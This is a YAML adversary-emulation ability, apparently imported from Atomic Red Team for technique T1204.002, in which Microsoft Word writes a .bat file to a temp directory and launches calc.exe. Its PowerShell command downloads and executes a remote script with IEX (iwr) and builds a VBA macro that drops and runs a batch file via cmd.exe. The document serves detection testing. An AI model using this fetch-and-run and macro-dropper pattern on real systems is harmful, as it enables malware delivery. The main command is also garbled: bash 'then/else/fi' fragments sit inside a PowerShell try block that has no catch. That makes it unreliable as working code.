- id: 9215ea92-1ded-41b7-9cd6-79f9a78397aa
  name: Office launching .bat file from AppData
  description: Microsoft Office creating then launching a .bat script from an AppData
    directory. The .bat file launches calc.exe when opened.
  tactic: execution
  technique:
    attack_id: T1204.002
    name: 'User Execution: Malicious File'
  platforms:
    windows:
      psh:
        command: 'try {; New-Object -COMObject "Word.Application" | Out-Null; $process
          = "Word"; then : ; else Write-Host "You will need to install Microsoft Word
          manually to meet this requirement"; fi; [Net.ServicePointManager]::SecurityProtocol
          = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
          -UseBasicParsing); $macrocode = "   Open `"$("$env:temp\art1204.bat")`"
          For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe
          /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"; Invoke-MalDoc -macroCode
          $macrocode -officeProduct Word'
        cleanup: 'Remove-Item #{bat_path} -ErrorAction Ignore; Get-Process | Where-Object
          { $_.MainModule.FileName -like "*calculator*" } | Stop-Process'
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1204.002
  - atomic-red-team
  - execution
  author: Atomic Red Team
  additional_info:
    input_arguments:
      bat_path:
        description: Path to malicious .bat file
        type: string
        default: $("$env:temp\art1204.bat")
      ms_product:
        description: Maldoc application Word or Excel
        type: string
        default: Word
    dependencies:
    - description: 'Microsoft #{ms_product} must be installed

        '
      prereq_command: "try {\n  New-Object -COMObject \"#{ms_product}.Application\"\
        \ | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\")\
        \ {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch\
        \ { exit 1 }\n"
      get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
        manually to meet this requirement"

        '
    technique_created: '2020-03-11T14:49:36.954Z'
    atomic_guid: 9215ea92-1ded-41b7-9cd6-79f9a78397aa
    import_timestamp: '2025-08-18T03:30:14.574922Z'
